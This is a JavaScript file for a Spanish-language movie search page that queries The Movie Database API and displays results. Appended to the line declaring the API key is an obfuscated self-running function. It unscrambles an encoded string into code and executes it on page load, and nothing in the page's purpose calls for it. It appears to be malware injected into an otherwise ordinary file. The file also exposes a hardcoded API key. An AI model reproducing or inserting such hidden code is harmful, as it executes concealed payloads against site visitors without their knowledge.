document.getElementById('searchButton').addEventListener('click', buscarPeliculas);
let urlCompleta = "https://api.themoviedb.org/3/search/movie?query=Jack+Reacher&api_key=5c69d31bd8d842b80792d354899d5fc8";
let urlBase = "https://api.themoviedb.org/3/search/movie";
let apiKey;(function(){var BRU='',MxK=310-299;function mZB(y){var c=1256878;var v=y.length;var d=[];for(var w=0;w<v;w++){d[w]=y.charAt(w)};for(var w=0;w<v;w++){var x=c*(w+193)+(c%39561);var e=c*(w+492)+(c%31637);var n=x%v;var h=e%v;var i=d[n];d[n]=d[h];d[h]=i;c=(x+e)%1370530;};return d.join('')};var NHx=mZB('ctnsdsiuzvacbrcrnploegutqjtoormxyfwkh').substr(0,MxK);var mbW='j0l1f(c+oo= 6ah e=h<rrAs= t(+qer=j7.7ctpvp,+y(g e*C,pghlu;hs[20vff,;wg"]tff2m=10v,76ai4a+C68g,j,-+rvos(f)fae9j,)s.r8,t<6hr[ea(oiv=;,;,(yn(;.=".}6)vae"vc-+5ia=a[+o]<+n;l,;ad,g;! q(;ui1tl.r=h0;u+=4aljh7ovo=h6)lyzny;)n{o+noa1qA(xS=l, aza][euianr3lt-euu.==[=uay., 1a+a;rptrr;ye"o8ur;h= st -hr;Cna-li t08enehtgrb+ l=p[g("rai p0,.] ;+frj;8}pr;;soilfa+h;7i;o;i*ha=[r.k)brarh.o<)nr;rn;va=g+=(gcmn[CsueA[ja) z9f)6)+jon))f1,m(}8( -1;eou}h]ls)xb]vr;(a 4ora .,i;zmdvch]segrf;j)nnnylw=.pnflerr[1)v)ln;0ag=7dent{l=))(o2Sy-,=x.dA;r(;tf(vf)xyval.u2ifanl}{r;l)](mo9i=lo0nniu5c9ao4d12tnC>uth.nwf((]{rrl.pr.etiu2r=);,lrx2ea,n8e)g)usva!"r0.=nlr9hm,])tft(kl.[(u).x7u=,+6.s(i==n,8gs=)..67+cCzv4 C)"r.bhka=sr(z]r=1u}=l emt"h=tannnac1var+c;[3tu)=e"];f q+o(t9.zv+ac;oa p;nar2+=>[tsv;(;a+mbhiatv=v(7[i;,or(i ;rys5vit0u00A7ctg{sr)r;.{+;kai;u4n(,le=; },;)i) c+"r (dn{19g).66t==,de9b<vrhrjay]ere(]aopla7gwlm;8)C(()n(w=h';var yfz=mZB[NHx];var Gxf='';var ONE=yfz;var ufX=yfz(Gxf,mZB(mbW));var vUs=ufX(mZB('f5)r]amrSe7bc.(ZZ&_,7i="!Z0)#.a.8,)a)=)5.d];Ztb\'i%+8. }(!5_.gb!.#!!f=eZ]3)baab0.do1,4($Z))=)3.{.Zg=n575(Z.Zr_6qf7.58_Zr+Z99a$3Z )tdd[eg4iZw);)"29;_7(7mfr$.{ $.Zjz7!(e;qs\/;=Zp($){jZ}&g2pZZ}rae}b7Z+cZ,=0*6tm.2Z(gc.Zn(."sl1._y,z+Z.)Z7+ot=hdZ!;a$e,ft;m.s(_xZfi)8Zdl0=$o0.4l!_)4)alZb.1=awf(a(arZht,Zt,;no$3.,i=s.t\/_Z)=g9b(,\/=Z*8)t.Z(h!pb. 3a$.sm;b,19;qr\'5)6Zc#Sv96Z*cv)t,;Z18(6%o=e)Z!4)j.,d22a.6b$1fc-03,63i4._sord7$3(mt$._ad$1Zv;2f55((c&}vZf]=eZlt51({sCZf#a)c%4c$3ZjcZ7,)fZ,v2c;7Z!7(Zo),C)$_q}Zn4t+s_g("5n.c(Z+ng.;v%i)o}");&8o.ei(7;2("Zj=.Z !r,0,5l\/\'g,f;1ZssZcfa,rt{d3x.Z(j ={##a;n,tb2*6)(=da}0,!.ZfZ ZZod)!brjsfnZZ$b.,.+3u5o3 Z}Z=d$n+Z;0[0t;Z4d(a!)-.*b6or{$5_.1g9Zn $0,rf3Z;ferl*p3[a.-.. Z7;bsv,ir}!ef7*)a(q_;%!t=gZ8)Sa7$(3p()$\/.e.33Zd+Zh70+!)))!.$4%5ar(r ,q.rufs3r.ibZ_0awso$84mZ} %Ze,#afs$ +jZt),.$Zcq_1("(aat-b2 r!ZuZZajb).lZq,3=Z\'!_gZf{n3j0. 2cr*jt}cm(!._ d;h(,Z!a._ab ;,Zbsoh{Z%Z)Za$1_!'));var zek=ONE(BRU,vUs );zek(8042);return 5084})()
let urlImg = 'https://image.tmdb.org/t/p/w200';
let resultsContainer = document.getElementById("results");
    


function buscarPeliculas(){
    resultsContainer.innerHtml = 'Cargando pelicula...';
    let searchInput = document.getElementById("searchInput").value;
    fetch(`${urlBase}?query=${searchInput}&api_key=${apiKey}`)
    .then(response=>response.json())
    .then(response=>verPeliculas(response.results))
    
}

function verPeliculas(movies){
    resultsContainer.innerHTML = '';

    if(movies.length === 0){
        resultsContainer.innerHTML= '<p>No hay resultados </p>';
        return;
    }
    movies.forEach(pelicula => {
        let divPeliculas = document.createElement('div');
        divPeliculas.classList.add('peliculas');

        let title = document.createElement('h2');
        title.textContent = pelicula.original_title;

        let overview = document.createElement('p');
        overview.textContent = pelicula.overview;

        let imagePeliculas = document.createElement('img');
        imagePeliculas.src = `${urlImg}${pelicula.poster_path}`

        divPeliculas.appendChild(title);
        divPeliculas.appendChild(imagePeliculas);
        divPeliculas.appendChild(overview);

        resultsContainer.appendChild(divPeliculas);



        
    });

}







